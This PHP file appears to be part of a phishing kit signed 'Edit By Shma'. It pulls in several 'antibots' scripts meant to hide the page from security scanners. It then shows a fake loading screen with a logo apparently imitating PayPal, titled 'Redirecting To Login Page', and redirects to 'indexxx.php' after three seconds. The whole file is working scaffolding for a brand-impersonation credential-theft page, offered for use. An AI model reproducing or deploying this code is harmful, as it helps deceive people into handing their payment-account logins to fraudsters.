<?php
/*   
  /$$$$$$  /$$                              
 /$$__  $$| $$                              
| $$  \__/| $$$$$$$  /$$$$$$/$$$$   /$$$$$$ 
|  $$$$$$ | $$__  $$| $$_  $$_  $$ |____  $$
 \____  $$| $$  \ $$| $$ \ $$ \ $$  /$$$$$$$
 /$$  \ $$| $$  | $$| $$ | $$ | $$ /$$__  $$
|  $$$$$$/| $$  | $$| $$ | $$ | $$|  $$$$$$$
\______/ |__/  |__/|__/ |__/ |__/ \_______/


               ###################Contact#####################
               #               Captcher Ver.3                #
               #               Edit By Shma                  #
               #               fb:fb.com/Shma.Hack           #
			   ###############################################
*/
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include "./BOTS/xBananaBotsPerfect.php";
?>
<html>

<head>
<meta charset="UTF-8">
<title>Redirecting To Login Page</title>
<link rel="shortout icon" href="img/favicon.ico"/>
    
    
    
</head>
<style>
        
        .logo{
            
            text-indent: -99999999px;
            background: url("logo.svg");
            width: 128px;
            height: 32px;
            
        }
        .loader{
             position: absolute;
    left: 45%;
    top: 40%;
            border:16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498cb;
            width: 100px;
            height: 100px;
            animation: spin 2s linear infinite;
            
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% {transform: rotate(360deg);}
        }
    .myclass {
    position:absolute;
    left: 44%;
    top:65%;
}
</style>
    
<body>
    
<h1 class="logo">pplogo</h1>
<div class="loader"></div>
<div class="myclass">Almost Done...</div>


</body>
<meta http-equiv="refresh" content="3;indexxx.php">
</html>